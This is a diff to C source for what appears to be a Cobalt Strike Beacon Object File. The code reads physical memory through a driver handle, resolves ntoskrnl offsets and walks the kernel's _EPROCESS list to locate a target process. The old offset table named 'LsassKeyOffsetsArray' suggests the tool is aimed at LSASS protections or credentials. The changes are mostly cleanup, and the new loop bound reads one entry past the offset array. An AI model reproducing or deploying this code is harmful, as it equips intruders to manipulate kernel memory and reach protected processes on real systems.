@@ -22,10 +22,9 @@ DWORD64 GetNtKernelVirtualAddresses(void)
     }
 
     int numberOfDevices = lpcbNeeded / sizeof(LPVOID);
-    //printf("Number of devices enumerated: %d\n", numberOfDevices);
 
     DWORD64 NtVirtualBaseAddress = (DWORD64)lpImageBase[0]; // ntoskrnl.exe
-    //printf("[+] Ntoskrnl Virtual Address: 0x%llx\n", NtVirtualBaseAddress);
+
     return NtVirtualBaseAddress;
 }
 
@@ -40,8 +39,6 @@ DWORD64 GetFunctionOffsetFromNtoskrnl(char* FunctionName)
         return 0;
     }
     DWORD64 GetFunctionOffset = (DWORD64)(GetProcAddress(Ntoskrnl, FunctionName)) - (DWORD64)Ntoskrnl;
-
-    //printf("[+] %s offset from Ntoskrnl base: 0x%llx\n", FunctionName, GetFunctionOffset);
 
     FreeLibrary(Ntoskrnl);
 
@@ -60,25 +57,22 @@ DWORD64 GetNtEprocessAddress(HANDLE hFile)
     TranslateV2P(PsInitialSystemProcessVA, &TargetPhysicalAddress);
     DWORD64 PsInitialSystemProcessPA = TargetPhysicalAddress;
 
-
     // Read physical memory at PsInitialSystemProcess to get _EPROCESS virtual address
     DWORD64 NtEprocessVirtualAddress = ReadAddressAtPhysicalAddressLocation(hFile, PsInitialSystemProcessPA);
 
-    //DEBUG_PRINT("NTOSKRNL _EPROCESS virtual address: 0x%llx\n", NtEprocessVirtualAddress);
     return NtEprocessVirtualAddress;
 }
 
-DWORD64 GetTargetEProcessAddress(HANDLE hFile, int TargetPID, DWORD64 NtEprocessVA, char* pvWindowsVersion)
+DWORD64 GetTargetEProcessAddress(HANDLE hFile, int TargetPID, DWORD64 NtEprocessVA, DWORD dBuildNumber)
 {
     int ActiveProcessLinksOffset = 0;
 
-    // Search for the string and get the corresponding hex value
     int i = 0;
-    for (i = 0; i < 5; i++)
+    for (i = 0; i < 5; i++) 
     {
-        if (strcmp(LsassKeyOffsetsArray[i].WindowsVersion, pvWindowsVersion) == 0)
+        if ( (dBuildNumber >= EPROCESSOffsetsArray[i].WindowsVersion) && (dBuildNumber < EPROCESSOffsetsArray[i+1].WindowsVersion) )
         {
-            ActiveProcessLinksOffset = LsassKeyOffsetsArray[i].ActiveProcessLinksOffset;
+            ActiveProcessLinksOffset = EPROCESSOffsetsArray[i].ActiveProcessLinksOffset;
 
             break;
         }
@@ -86,7 +80,7 @@ DWORD64 GetTargetEProcessAddress(HANDLE hFile, int TargetPID, DWORD64 NtEprocess
 
     if (ActiveProcessLinksOffset == 0)
     {
-        BeaconFormatPrintf(&outputbuffer, "Failed to get correct offsets for the Windows version!\n");
+        BeaconFormatPrintf(&outputbuffer, "[!] Failed to get correct offsets for the Windows version!\n");
         return 0;
     }
 
@@ -97,7 +91,6 @@ DWORD64 GetTargetEProcessAddress(HANDLE hFile, int TargetPID, DWORD64 NtEprocess
         return 0; // invalid address
     }
     DWORD64 NtEProcessPA = TargetPhysicalAddress;
-
 
     // Get the Flink for Nt's ActiveProcessLinks member and start from there
     DWORD64 InitialActiveProcessLinksFlink = NtEProcessPA + ActiveProcessLinksOffset;
@@ -121,7 +114,7 @@ DWORD64 GetTargetEProcessAddress(HANDLE hFile, int TargetPID, DWORD64 NtEprocess
         }
         if (FlinkPID == 4) // We looped back around to SYSTEM (Nt) pid
         {
-            BeaconFormatPrintf(&outputbuffer, "Could not find _EPROCESS address for target process!");
+            BeaconFormatPrintf(&outputbuffer, "[!] Could not find _EPROCESS address for target process!");
             break;
         }
 
@@ -143,7 +136,7 @@ DWORD64 GetTargetEProcessAddress(HANDLE hFile, int TargetPID, DWORD64 NtEprocess
             }
             else
             {
-                BeaconFormatPrintf(&outputbuffer, "Failed to get _EPROCESS address of target process!");
+                BeaconFormatPrintf(&outputbuffer, "[!] Failed to get _EPROCESS address of target process!");
                 return 0;
             }
         }
